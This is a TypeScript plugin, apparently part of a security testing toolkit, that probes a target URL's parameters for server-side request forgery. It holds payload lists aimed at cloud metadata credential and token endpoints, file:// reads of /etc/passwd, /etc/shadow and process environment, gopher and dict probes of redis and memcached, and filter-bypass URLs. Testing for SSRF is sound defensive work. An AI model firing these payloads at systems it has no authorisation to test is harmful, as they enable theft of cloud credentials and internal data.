/**
 * SSRF Detector Tool
 * 
 * @plugin ssrf_detector
 * @name SSRF Detector
 * @version 1.0.0
 * @author Sentinel Team
 * @category vuln
 * @default_severity high
 * @tags ssrf, vulnerability, security, web
 * @description Detect Server-Side Request Forgery (SSRF) vulnerabilities by testing URL parameters with various payloads
 */

interface ToolInput {
    url: string;
    method?: string;
    params?: Record<string, string>;
    headers?: Record<string, string>;
    body?: string;
    timeout?: number;
    userAgent?: string;
    callbackUrl?: string;
    testInternal?: boolean;
    testCloud?: boolean;
    testProtocols?: boolean;
}

interface SsrfTest {
    parameter: string;
    payload: string;
    payloadType: string;
    vulnerable: boolean;
    evidence?: string;
    responseCode?: number;
    responseTime?: number;
    error?: string;
}

interface ToolOutput {
    success: boolean;
    data?: {
        url: string;
        method: string;
        tests: SsrfTest[];
        summary: {
            totalTests: number;
            vulnerableCount: number;
            testedParameters: string[];
            vulnerableParameters: string[];
        };
    };
    error?: string;
}

// SSRF payloads organized by type
const SSRF_PAYLOADS: Record<string, { payload: string; description: string }[]> = {
    localhost: [
        { payload: "http://localhost", description: "Basic localhost" },
        { payload: "http://localhost:80", description: "Localhost port 80" },
        { payload: "http://localhost:443", description: "Localhost port 443" },
        { payload: "http://localhost:22", description: "Localhost SSH port" },
        { payload: "http://localhost:3306", description: "Localhost MySQL port" },
        { payload: "http://127.0.0.1", description: "IPv4 loopback" },
        { payload: "http://127.0.0.1:80", description: "IPv4 loopback port 80" },
        { payload: "http://127.1", description: "Short IPv4 loopback" },
        { payload: "http://0.0.0.0", description: "All interfaces" },
        { payload: "http://0", description: "Zero address" },
        { payload: "http://[::1]", description: "IPv6 loopback" },
        { payload: "http://[0:0:0:0:0:0:0:1]", description: "Full IPv6 loopback" },
        { payload: "http://0177.0.0.1", description: "Octal localhost" },
        { payload: "http://0x7f.0.0.1", description: "Hex localhost" },
        { payload: "http://2130706433", description: "Decimal localhost" },
        { payload: "http://017700000001", description: "Octal full localhost" },
        { payload: "http://0x7f000001", description: "Hex full localhost" },
    ],
    
    internal: [
        { payload: "http://192.168.0.1", description: "Common router IP" },
        { payload: "http://192.168.1.1", description: "Common router IP" },
        { payload: "http://10.0.0.1", description: "Private network" },
        { payload: "http://172.16.0.1", description: "Private network" },
        { payload: "http://169.254.169.254", description: "Link-local metadata" },
        { payload: "http://internal", description: "Internal hostname" },
        { payload: "http://intranet", description: "Intranet hostname" },
        { payload: "http://corp", description: "Corp hostname" },
    ],
    
    cloud_aws: [
        { payload: "http://169.254.169.254/latest/meta-data/", description: "AWS metadata endpoint" },
        { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", description: "AWS IAM credentials" },
        { payload: "http://169.254.169.254/latest/user-data/", description: "AWS user data" },
        { payload: "http://169.254.169.254/latest/meta-data/hostname", description: "AWS hostname" },
        { payload: "http://169.254.169.254/latest/meta-data/local-ipv4", description: "AWS local IP" },
        { payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", description: "AWS instance identity" },
        { payload: "http://[fd00:ec2::254]/latest/meta-data/", description: "AWS IPv6 metadata" },
    ],
    
    cloud_gcp: [
        { payload: "http://metadata.google.internal/computeMetadata/v1/", description: "GCP metadata" },
        { payload: "http://169.254.169.254/computeMetadata/v1/", description: "GCP metadata alt" },
        { payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", description: "GCP token" },
        { payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id", description: "GCP project ID" },
    ],
    
    cloud_azure: [
        { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", description: "Azure metadata" },
        { payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", description: "Azure token" },
    ],
    
    cloud_digitalocean: [
        { payload: "http://169.254.169.254/metadata/v1/", description: "DigitalOcean metadata" },
        { payload: "http://169.254.169.254/metadata/v1/id", description: "DigitalOcean droplet ID" },
        { payload: "http://169.254.169.254/metadata/v1/hostname", description: "DigitalOcean hostname" },
    ],
    
    protocols: [
        { payload: "file:///etc/passwd", description: "File protocol - passwd" },
        { payload: "file:///etc/hosts", description: "File protocol - hosts" },
        { payload: "file:///etc/shadow", description: "File protocol - shadow" },
        { payload: "file:///proc/self/environ", description: "File protocol - environ" },
        { payload: "file:///proc/self/cmdline", description: "File protocol - cmdline" },
        { payload: "file://localhost/etc/passwd", description: "File with localhost" },
        { payload: "file:///c:/windows/win.ini", description: "Windows file" },
        { payload: "dict://localhost:11211/stat", description: "Dict protocol - memcached" },
        { payload: "gopher://localhost:6379/_INFO", description: "Gopher protocol - redis" },
        { payload: "ftp://localhost", description: "FTP protocol" },
        { payload: "sftp://localhost", description: "SFTP protocol" },
        { payload: "tftp://localhost/file", description: "TFTP protocol" },
        { payload: "ldap://localhost", description: "LDAP protocol" },
    ],
    
    bypass: [
        { payload: "http://localhost%00.evil.com", description: "Null byte bypass" },
        { payload: "http://localhost%2500.evil.com", description: "Double URL encode bypass" },
        { payload: "http://evil.com@localhost", description: "Basic auth bypass" },
        { payload: "http://localhost#@evil.com", description: "Fragment bypass" },
        { payload: "http://localhost?.evil.com", description: "Query bypass" },
        { payload: "http://localhost\\@evil.com", description: "Backslash bypass" },
        { payload: "http://localhost%23@evil.com", description: "Encoded hash bypass" },
        { payload: "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", description: "Unicode bypass" },
        { payload: "http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ", description: "Unicode domain" },
        { payload: "http://localhost。evil.com", description: "Fullwidth dot bypass" },
        { payload: "http://127。0。0。1", description: "Fullwidth dots IP" },
        { payload: "http://localtest.me", description: "DNS rebinding domain" },
        { payload: "http://spoofed.burpcollaborator.net", description: "Collaborator domain" },
    ],
    
    redirect: [
        { payload: "http://httpbin.org/redirect-to?url=http://localhost", description: "Open redirect to localhost" },
        { payload: "http://httpbin.org/redirect-to?url=http://169.254.169.254/", description: "Open redirect to metadata" },
    ],
};

// Indicators of successful SSRF
const SSRF_INDICATORS = [
    // AWS metadata
    /ami-id/i,
    /instance-id/i,
    /security-credentials/i,
    /iam\/info/i,
    
    // GCP metadata
    /computeMetadata/i,
    /service-accounts/i,
    
    // Azure metadata
    /vmId/i,
    /subscriptionId/i,
    
    // File contents
    /root:.*:0:0/,  // /etc/passwd
    /localhost/i,    // /etc/hosts
    /\[extensions\]/i, // win.ini
    
    // Internal services
    /redis_version/i,
    /memcached/i,
    /STAT items/i,
    
    // Error messages indicating SSRF
    /Connection refused/i,
    /Connection timed out/i,
    /No route to host/i,
    /Network is unreachable/i,
];

/**
 * Export input schema
 */
export function get_input_schema() {
    return {
        type: "object",
        required: ["url"],
        properties: {
            url: {
                type: "string",
                description: "Target URL with potential SSRF parameters"
            },
            method: {
                type: "string",
                enum: ["GET", "POST", "PUT", "PATCH"],
                description: "HTTP method",
                default: "GET"
            },
            params: {
                type: "object",
                description: "URL parameters to test (key-value pairs)",
                additionalProperties: { type: "string" }
            },
            headers: {
                type: "object",
                description: "Custom headers to include",
                additionalProperties: { type: "string" }
            },
            body: {
                type: "string",
                description: "Request body for POST/PUT requests"
            },
            timeout: {
                type: "integer",
                description: "Request timeout in milliseconds",
                default: 10000,
                minimum: 1000,
                maximum: 30000
            },
            userAgent: {
                type: "string",
                description: "Custom User-Agent header"
            },
            callbackUrl: {
                type: "string",
                description: "Callback URL for out-of-band detection (e.g., Burp Collaborator)"
            },
            testInternal: {
                type: "boolean",
                description: "Test internal network payloads",
                default: true
            },
            testCloud: {
                type: "boolean",
                description: "Test cloud metadata payloads",
                default: true
            },
            testProtocols: {
                type: "boolean",
                description: "Test alternative protocols (file://, gopher://, etc.)",
                default: true
            }
        }
    };
}

globalThis.get_input_schema = get_input_schema;

/**
 * Export output schema
 */
export function get_output_schema() {
    return {
        type: "object",
        properties: {
            success: { type: "boolean", description: "Whether the operation succeeded" },
            data: {
                type: "object",
                properties: {
                    url: { type: "string", description: "Target URL" },
                    method: { type: "string" },
                    tests: {
                        type: "array",
                        items: {
                            type: "object",
                            properties: {
                                parameter: { type: "string" },
                                payload: { type: "string" },
                                payloadType: { type: "string" },
                                vulnerable: { type: "boolean" },
                                evidence: { type: "string" }
                            }
                        },
                        description: "SSRF test results"
                    },
                    summary: {
                        type: "object",
                        properties: {
                            totalTests: { type: "integer" },
                            vulnerableCount: { type: "integer" },
                            vulnerableParameters: { type: "array", items: { type: "string" } }
                        }
                    }
                }
            },
            error: { type: "string", description: "Error message if failed" }
        }
    };
}

globalThis.get_output_schema = get_output_schema;

/**
 * Parse URL and extract parameters
 */
function parseUrl(url: string): { baseUrl: string; params: Record<string, string> } {
    try {
        const urlObj = new URL(url);
        const params: Record<string, string> = {};
        urlObj.searchParams.forEach((value, key) => {
            params[key] = value;
        });
        return {
            baseUrl: `${urlObj.origin}${urlObj.pathname}`,
            params,
        };
    } catch {
        return { baseUrl: url, params: {} };
    }
}

/**
 * Build URL with parameters
 */
function buildUrl(baseUrl: string, params: Record<string, string>): string {
    const url = new URL(baseUrl);
    for (const [key, value] of Object.entries(params)) {
        url.searchParams.set(key, value);
    }
    return url.toString();
}

/**
 * Check if response indicates SSRF
 */
function checkSsrfIndicators(responseText: string): string | null {
    for (const indicator of SSRF_INDICATORS) {
        if (indicator.test(responseText)) {
            const match = responseText.match(indicator);
            return match ? match[0] : "Pattern matched";
        }
    }
    return null;
}

/**
 * Identify URL-like parameters
 */
function identifyUrlParams(params: Record<string, string>): string[] {
    const urlParams: string[] = [];
    const urlParamNames = [
        "url", "uri", "link", "href", "src", "source", "dest", "destination",
        "redirect", "redirect_uri", "redirect_url", "return", "return_url",
        "next", "next_url", "target", "path", "file", "page", "load",
        "fetch", "request", "proxy", "forward", "callback", "continue",
        "image", "img", "picture", "photo", "avatar", "icon", "logo",
        "feed", "rss", "xml", "data", "content", "resource", "ref",
        "site", "host", "domain", "endpoint", "api", "service",
    ];
    
    for (const [key, value] of Object.entries(params)) {
        const lowerKey = key.toLowerCase();
        
        // Check if parameter name suggests URL
        if (urlParamNames.some(name => lowerKey.includes(name))) {
            urlParams.push(key);
            continue;
        }
        
        // Check if value looks like URL
        if (value.startsWith("http://") || value.startsWith("https://") || value.startsWith("//")) {
            urlParams.push(key);
        }
    }
    
    return urlParams;
}

/**
 * Test a single SSRF payload
 */
async function testPayload(
    baseUrl: string,
    params: Record<string, string>,
    targetParam: string,
    payload: string,
    payloadType: string,
    options: {
        method: string;
        headers: Record<string, string>;
        timeout: number;
    }
): Promise<SsrfTest> {
    const testParams = { ...params, [targetParam]: payload };
    const testUrl = buildUrl(baseUrl, testParams);
    const startTime = performance.now();
    
    try {
        const response = await fetch(testUrl, {
            method: options.method,
            headers: options.headers,
            redirect: "follow",
            // @ts-ignore
            timeout: options.timeout,
        });
        
        const responseTime = Math.round(performance.now() - startTime);
        const responseText = await response.text();
        
        // Check for SSRF indicators
        const evidence = checkSsrfIndicators(responseText);
        
        // Check for timing-based detection (slow response might indicate internal network access)
        const timingAnomaly = responseTime > 5000;
        
        // Check for different response compared to baseline
        const vulnerable = evidence !== null || timingAnomaly;
        
        return {
            parameter: targetParam,
            payload,
            payloadType,
            vulnerable,
            evidence: evidence || (timingAnomaly ? "Slow response (possible internal network access)" : undefined),
            responseCode: response.status,
            responseTime,
        };
        
    } catch (error: any) {
        const responseTime = Math.round(performance.now() - startTime);
        
        // Some errors might indicate SSRF (e.g., connection refused to internal service)
        const errorMessage = error.message || String(error);
        const errorIndicatesAccess = /refused|timeout|unreachable/i.test(errorMessage);
        
        return {
            parameter: targetParam,
            payload,
            payloadType,
            vulnerable: errorIndicatesAccess,
            evidence: errorIndicatesAccess ? `Error indicates internal access: ${errorMessage}` : undefined,
            responseTime,
            error: errorMessage,
        };
    }
}

/**
 * Main analysis function
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    try {
        // Validate input
        if (!input.url || typeof input.url !== "string") {
            return {
                success: false,
                error: "Invalid input: url parameter is required"
            };
        }
        
        const { baseUrl, params: urlParams } = parseUrl(input.url);
        const params = { ...urlParams, ...(input.params || {}) };
        
        const method = input.method || "GET";
        const timeout = input.timeout || 10000;
        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        const testInternal = input.testInternal !== false;
        const testCloud = input.testCloud !== false;
        const testProtocols = input.testProtocols !== false;
        
        const headers: Record<string, string> = {
            "User-Agent": userAgent,
            "Accept": "*/*",
            ...(input.headers || {}),
        };
        
        // Identify URL-like parameters to test
        const urlParamsToTest = identifyUrlParams(params);
        
        if (urlParamsToTest.length === 0) {
            return {
                success: true,
                data: {
                    url: input.url,
                    method,
                    tests: [],
                    summary: {
                        totalTests: 0,
                        vulnerableCount: 0,
                        testedParameters: [],
                        vulnerableParameters: [],
                    },
                },
            };
        }
        
        // Build payload list based on options
        const payloadsToTest: { payload: string; type: string }[] = [];
        
        // Always test localhost
        for (const p of SSRF_PAYLOADS.localhost) {
            payloadsToTest.push({ payload: p.payload, type: "localhost" });
        }
        
        if (testInternal) {
            for (const p of SSRF_PAYLOADS.internal) {
                payloadsToTest.push({ payload: p.payload, type: "internal" });
            }
        }
        
        if (testCloud) {
            for (const p of SSRF_PAYLOADS.cloud_aws) {
                payloadsToTest.push({ payload: p.payload, type: "cloud_aws" });
            }
            for (const p of SSRF_PAYLOADS.cloud_gcp) {
                payloadsToTest.push({ payload: p.payload, type: "cloud_gcp" });
            }
            for (const p of SSRF_PAYLOADS.cloud_azure) {
                payloadsToTest.push({ payload: p.payload, type: "cloud_azure" });
            }
        }
        
        if (testProtocols) {
            for (const p of SSRF_PAYLOADS.protocols) {
                payloadsToTest.push({ payload: p.payload, type: "protocols" });
            }
        }
        
        // Add bypass payloads
        for (const p of SSRF_PAYLOADS.bypass.slice(0, 5)) {
            payloadsToTest.push({ payload: p.payload, type: "bypass" });
        }
        
        // Add callback URL if provided
        if (input.callbackUrl) {
            payloadsToTest.push({ payload: input.callbackUrl, type: "callback" });
        }
        
        // Run tests
        const tests: SsrfTest[] = [];
        
        for (const param of urlParamsToTest) {
            for (const { payload, type } of payloadsToTest) {
                const result = await testPayload(
                    baseUrl,
                    params,
                    param,
                    payload,
                    type,
                    { method, headers, timeout }
                );
                tests.push(result);
                
                // If we found a vulnerability, we can reduce testing
                if (result.vulnerable) {
                    // Still test a few more payloads to gather evidence
                }
            }
        }
        
        // Build summary
        const vulnerableTests = tests.filter(t => t.vulnerable);
        const vulnerableParameters = [...new Set(vulnerableTests.map(t => t.parameter))];
        
        return {
            success: true,
            data: {
                url: input.url,
                method,
                tests,
                summary: {
                    totalTests: tests.length,
                    vulnerableCount: vulnerableTests.length,
                    testedParameters: urlParamsToTest,
                    vulnerableParameters,
                },
            },
        };
        
    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error),
        };
    }
}

globalThis.analyze = analyze;
